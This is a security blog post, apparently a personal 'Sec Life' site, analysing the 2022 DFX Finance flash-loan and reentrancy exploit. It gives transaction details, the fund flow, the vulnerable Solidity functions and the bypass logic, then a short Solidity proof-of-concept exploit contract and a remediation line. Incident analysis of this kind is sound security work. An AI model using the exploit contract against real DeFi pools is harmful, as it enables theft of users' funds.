@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      03.DFX Finance @Reentrancy@flashloan 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">03.DFX Finance @Reentrancy@flashloan</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-07-15 20:20:56
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/08-PoC/" title="08.PoC">
+                    <b>#</b> 08.PoC
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DFX-Finance-Reentrancy-flashloan"><a href="#DFX-Finance-Reentrancy-flashloan" class="headerlink" title="DFX Finance @Reentrancy@flashloan"></a>DFX Finance @Reentrancy@flashloan</h1><p><strong>KEY WORDS:</strong> flashloan, reentrancy</p>
+<p><strong>ATTACK TIME:</strong> 2022.11.11</p>
+<p><strong>LOSSES：</strong>4 million$</p>
+<h2 id="Event-Background"><a href="#Event-Background" class="headerlink" title="Event Background"></a>Event Background</h2><p>DFX is an Ethereum-based decentralized exchange protocol with a dynamically tuned bonding curve optimized for fiat-backed stablecoins (like USDC, CADC, EURS, XSGD, etc) using real-world FX price feeds.</p>
+<h2 id="Tx-Details"><a href="#Tx-Details" class="headerlink" title="Tx Details"></a>Tx Details</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">one of attack txs</a></p>
+<ul>
+<li><p>hacker contract: 0x6cfa86a352339e766ff1ca119c8c40824f41f22d</p>
+</li>
+<li><p>dfx-xidr-v2 contract: 0x46161158b1947d9149e066d6d31af1283b2d377c</p>
+</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">fund change</a></p>
+</li>
+<li>0x27e843260c71443b4cc8cb6bf226c3f77b9695af: it is a multi wallet that receives fee with the <code>flashloan()</code>.</li>
+</ul>
+<p><img src="https://moe.photo/images/2023/07/15/image-20230715204009696.png" alt></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://metasleuth.io/result/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">fund flow</a><ul>
+<li>[1] [2]: hacker borrowed a lot of USDC and XIDR from dfx</li>
+<li>[3] [4]: hacker paid back USDC and XIDR to dfx</li>
+<li>[5] : <code>token dfx-xidr-v2</code> was minted to hacker</li>
+<li>[6] [7] : DFX multi wallet receives some USDC and XIDR as fee of <code>flashloan()</code></li>
+<li>[8] : hacker burned <code>token dfx-xidr-v2</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="https://moe.photo/images/2023/07/15/image-20230715233935474.png" alt></p>
+<h2 id="Attack-Process"><a href="#Attack-Process" class="headerlink" title="Attack Process"></a>Attack Process</h2><h3 id="The-entire-attack-process"><a href="#The-entire-attack-process" class="headerlink" title="The entire attack process"></a>The entire attack process</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213612801.png" alt></p>
+<h3 id="1-preparation"><a href="#1-preparation" class="headerlink" title="1.preparation"></a>1.preparation</h3><p>why hackercall viewDeposit()?</p>
+<p>Hacker wanted to know how much token pair  he should deposit to get <code>200,000*1e18</code> <code>token dfx-xidr-v2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/// @notice view deposits and curves minted a given deposit would return</span><br><span class="line">    /// @param _deposit the full amount of stablecoins you want to deposit. Divided evenly according to the</span><br><span class="line">    ///                 prevailing proportions of the numeraire assets of the pool</span><br><span class="line">    /// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">    ///          the amount deposited for each numeraire)</span><br><span class="line">    function viewDeposit(uint256 _deposit) external view transactable returns (uint256, uint256[] memory) &#123;</span><br><span class="line">        // curvesToMint_, depositsToMake_</span><br><span class="line">        return ProportionalLiquidity.viewProportionalDeposit(curve, _deposit);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-flashloan"><a href="#2-flashloan" class="headerlink" title="2.flashloan"></a>2.flashloan</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715211603181.png" alt></p>
+<p>in flash() we know it is similar to uniswapV2’s <code>flashloan()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function flash(</span><br><span class="line">       address recipient,</span><br><span class="line">       uint256 amount0,</span><br><span class="line">       uint256 amount1,</span><br><span class="line">       bytes calldata data</span><br><span class="line">   ) external transactable noDelegateCall isNotEmergency &#123;</span><br><span class="line">       uint256 fee = curve.epsilon.mulu(1e18);</span><br><span class="line">       </span><br><span class="line">       require(IERC20(derivatives[0]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token0-zero-liquidity-depth&#x27;);</span><br><span class="line">       require(IERC20(derivatives[1]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token1-zero-liquidity-depth&#x27;);</span><br><span class="line">       </span><br><span class="line">       // calculate the fee and money</span><br><span class="line">       uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);</span><br><span class="line">       uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);</span><br><span class="line">       uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">       uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">	// lend money</span><br><span class="line">       if (amount0 &gt; 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);</span><br><span class="line">       if (amount1 &gt; 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);</span><br><span class="line"></span><br><span class="line">	// fallabck</span><br><span class="line">       IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);</span><br><span class="line"></span><br><span class="line">       uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">       uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">	// check the balance</span><br><span class="line">       require(balance0Before.add(fee0) &lt;= balance0After, &#x27;Curve/insufficient-token0-returned&#x27;);</span><br><span class="line">       require(balance1Before.add(fee1) &lt;= balance1After, &#x27;Curve/insufficient-token1-returned&#x27;);</span><br><span class="line"></span><br><span class="line">       // sub is safe because we know balanceAfter is gt balanceBefore by at least fee</span><br><span class="line">       uint256 paid0 = balance0After - balance0Before;</span><br><span class="line">       uint256 paid1 = balance1After - balance1Before;</span><br><span class="line"></span><br><span class="line">       IERC20(derivatives[0]).safeTransfer(owner, paid0);        </span><br><span class="line">       IERC20(derivatives[1]).safeTransfer(owner, paid1);        </span><br><span class="line"></span><br><span class="line">       emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);</span><br><span class="line">   &#125;    </span><br></pre></td></tr></table></figure>
+<h3 id="3-pay-back-for-flashloan"><a href="#3-pay-back-for-flashloan" class="headerlink" title="3.pay back for flashloan"></a>3.pay back for flashloan</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213717257.png" alt></p>
+<h3 id="4-flashCallBack"><a href="#4-flashCallBack" class="headerlink" title="4.flashCallBack"></a>4.flashCallBack</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715212158778.png" alt></p>
+<p>deposit():</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/// @notice deposit into the pool with no slippage from the numeraire assets the pool supports</span><br><span class="line">    /// @param  _deposit the full amount you want to deposit into the pool which will be divided up evenly amongst</span><br><span class="line">    ///                  the numeraire assets of the pool</span><br><span class="line">    /// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">    ///          the amount deposited for each numeraire)</span><br><span class="line">    function deposit(uint256 _deposit, uint256 _deadline)</span><br><span class="line">        external</span><br><span class="line">        deadline(_deadline)</span><br><span class="line">        transactable</span><br><span class="line">        nonReentrant</span><br><span class="line">        noDelegateCall</span><br><span class="line">        notInWhitelistingStage</span><br><span class="line">        isNotEmergency</span><br><span class="line">        returns (uint256, uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        // (curvesMinted_,  deposits_)</span><br><span class="line">        return ProportionalLiquidity.proportionalDeposit(curve, _deposit);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>Hacker deposited USDC and XIDR that he got in flashloan to mint <code>token dfx-xidr-usdc</code>. Attention, hacker did deposit meaned that contract dfx-xidr-usdc would receive this USDC and XIDR, resulting at pass these checking:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(balance0Before.add(fee0) &lt;= balance0After, &#x27;Curve/insufficient-token0-returned&#x27;);</span><br><span class="line">require(balance1Before.add(fee1) &lt;= balance1After, &#x27;Curve/insufficient-token1-returned&#x27;);</span><br></pre></td></tr></table></figure>
+<h3 id="5-withdraw-amp-exploit"><a href="#5-withdraw-amp-exploit" class="headerlink" title="5.withdraw&amp;exploit"></a>5.withdraw&amp;exploit</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213819792.png" alt></p>
+<h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>attack logic is the same as <a target="_blank" rel="noopener" href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/04.Side%20Entrance/">Damn Vulnerable DeFi CTF’s Side Entrance</a>.</p>
+<h2 id="Attack-Recurrence"><a href="#Attack-Recurrence" class="headerlink" title="Attack Recurrence"></a>Attack Recurrence</h2><p>the entire PoC is <a target="_blank" rel="noopener" href="https://github.com/chen4903/BlockChainPoC/blob/master/test/DFX.sol">here</a>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract EXP &#123;</span><br><span class="line">    uint256 amount;</span><br><span class="line">    function testExploit() public&#123;</span><br><span class="line">        uint[] memory XIDR_USDC = new uint[](2);</span><br><span class="line">        XIDR_USDC[0] = 0;</span><br><span class="line">        XIDR_USDC[1] = 0;</span><br><span class="line">        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);</span><br><span class="line">        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee</span><br><span class="line">        dfx.withdraw(amount, block.timestamp + 60);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external&#123;</span><br><span class="line">    	(amount, ) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>fixed flashloan() checking logic</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/07/15/00.security/43.Hiding%20Malicious%20Code%20with%20External%20Contract/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-07-15 20:20:56
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/08-PoC/" title="08.PoC">
+                        <b>#</b> 08.PoC
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DFX-Finance-Reentrancy-flashloan"><span class="toc-text">DFX Finance @Reentrancy@flashloan</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Event-Background"><span class="toc-text">Event Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tx-Details"><span class="toc-text">Tx Details</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-Process"><span class="toc-text">Attack Process</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-entire-attack-process"><span class="toc-text">The entire attack process</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-preparation"><span class="toc-text">1.preparation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-flashloan"><span class="toc-text">2.flashloan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-pay-back-for-flashloan"><span class="toc-text">3.pay back for flashloan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-flashCallBack"><span class="toc-text">4.flashCallBack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-withdraw-amp-exploit"><span class="toc-text">5.withdraw&amp;exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-Recurrence"><span class="toc-text">Attack Recurrence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation"><span class="toc-text">Remediation</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 03.DFX%20Finance%20%40Reentrancy%40flashloan + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F15%2F08.PoC%2F03.DFX%2520Finance%2520%40Reentrancy%40flashloan%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/15/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
